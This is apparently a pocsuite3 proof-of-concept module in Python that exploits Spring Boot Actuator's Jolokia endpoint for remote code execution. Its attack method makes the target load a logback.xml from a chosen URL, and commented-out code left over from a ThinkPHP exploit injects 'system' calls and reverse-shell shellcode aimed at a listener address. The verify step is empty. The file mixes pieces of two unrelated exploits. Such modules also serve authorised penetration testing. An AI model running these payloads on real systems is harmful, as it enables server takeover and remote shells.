"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, \
    VUL_TYPE
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import REVERSE_PAYLOAD


class DemoPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1.0'
    author = ['funny']
    vulDate = '2019-12-7'
    createDate = '2019-12-7'
    name = 'Spring boot Actuator jolokia 远程代码执行漏洞'
    appPowerLink = 'http://www.jolokia.org/'
    appName = 'Spring boot Actuator jolokia'
    appVersion = 'spring boot1.4该配置默认开启,1.5版本之后默认关闭'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Spring Boot Acuator 可以帮助你监控和管理Spring Boot应用,jolokia 是一个实现JMX的开源项目，
                但是在spring boot中，利用jolokia配置不当可以实现远程命令执行'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    # def _check(self, url):
    #     flag = 'PHP Extension Build'
    #     data = "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"
    #
    #     payloads = [
    #         r"/index.php?s=captcha"
    #     ]
    #     for payload in payloads:
    #         vul_url = url + payload
    #         headers = {
    #             "Content-Type": "application/x-www-form-urlencoded"
    #         }
    #         r = requests.post(vul_url, data=data, headers=headers)
    #
    #         if flag in r.text:
    #             return payload, data
    #     return False

    def _verify(self):
        result = {}
        # p = self._check(self.url)
        # if p:
        #     result['VerifyInfo'] = {}
        #     result['VerifyInfo']['URL'] = p[0]
        #     result['VerifyInfo']['Postdata'] = p[1]

        return self.parse_output(result)

    def _attack(self):
        result = {}

        payload = "/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:8080!/logback.xml"
        vul_url = self.url + payload
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        logger.info("url: {}".format(vul_url))
        r = requests.get(vul_url, headers=headers)
        if r.status_code == 200:
            result['ShellInfo'] = {}
            result['ShellInfo']['Content'] = r.text
        return self.parse_output(result)

    # def _shell(self):
    #     vulurl = self.url + "/index.php?s=captcha"
    #     # 生成写入文件的shellcode
    #     _list = generate_shellcode_list(listener_ip=get_listener_ip(), listener_port=get_listener_port(),
    #                                     os_target=OS.WINDOWS,
    #                                     os_target_arch=OS_ARCH.X64)
    #     for i in _list:
    #         data = {
    #             '_method': '__construct',
    #             'filter[]': 'system',
    #             'method': 'get',
    #             'server[REQUEST_METHOD]': i
    #         }
    #         headers = {
    #             "Content-Type": "application/x-www-form-urlencoded"
    #         }
    #         requests.post(vulurl, data=data, headers=headers)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
